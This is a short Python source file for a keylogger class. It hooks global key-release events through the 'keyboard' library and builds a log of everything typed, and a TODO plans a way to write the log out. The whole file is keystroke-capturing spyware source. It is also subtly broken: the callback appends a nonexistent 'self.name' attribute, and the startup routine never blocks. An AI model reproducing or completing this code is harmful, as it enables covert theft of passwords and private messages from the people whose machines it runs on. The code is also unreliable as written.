import keyboard


'''
  TODO
  [x] create a global variable to store logs
  [ ] create a write out object
'''
class Keylogger():
  def __init__(self):
    self.log = ""

  def callback(self,event):
    name = event.name

    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[ENTER]\n"
      elif name == "tab":
        name = "[TAB]\t"
      elif name == "decimal":
        name = "."
      else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += self.name

  def startup(self):
    keyboard.on_release(callback=self.callback)

if __name__ == '__main__':
  keylogger = Keylogger()
  keylogger.startup()
